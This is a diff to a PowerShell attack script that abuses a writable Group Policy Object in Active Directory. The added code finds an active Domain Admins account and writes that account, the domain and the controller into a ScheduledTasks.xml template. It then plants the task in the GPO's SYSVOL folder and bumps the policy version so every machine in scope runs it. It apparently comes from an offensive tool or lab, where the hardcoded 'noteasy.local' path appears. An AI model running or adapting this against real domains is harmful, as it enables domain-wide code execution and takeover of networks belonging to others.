@@ -11,6 +11,36 @@ if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMach
 } else {
     $noext=1
 }
+$i = 0
+while($gotcha -ne "1"){
+    $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
+    if(((net user $dauser /dom | findstr active)[29]) -eq "Y"){
+        $gotcha++
+    } else {
+        $i++
+    }
+}
+$pwd = (pwd | select Path -ExpandProperty Path)
+$xmlfile = "$pwd\ScheduledTasks.xml"
+$encoding = 'ASCII'
+$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+$xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+            Set-Content -Encoding $encoding $xmlfile -Force
+$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+$xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+            Set-Content -Encoding $encoding $xmlfile -Force
+$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+$xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$env:USERNAME"} |
+            Set-Content -Encoding $encoding $xmlfile -Force
+$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+$xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
+            Set-Content -Encoding $encoding $xmlfile -Force
+if(cat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"){
+    Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\noteasy.local\SYSVOL\noteasy.local\Policies\{095EB75F-4CE4-4E9E-AAB9-2BE3B23549BD}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
+} else {
+    New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force
+    Copy-Item .\ScheduledTasks.xml "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+}
 $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
 $GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
 echo "[+] Incrementing GPT.INI Version by 1"
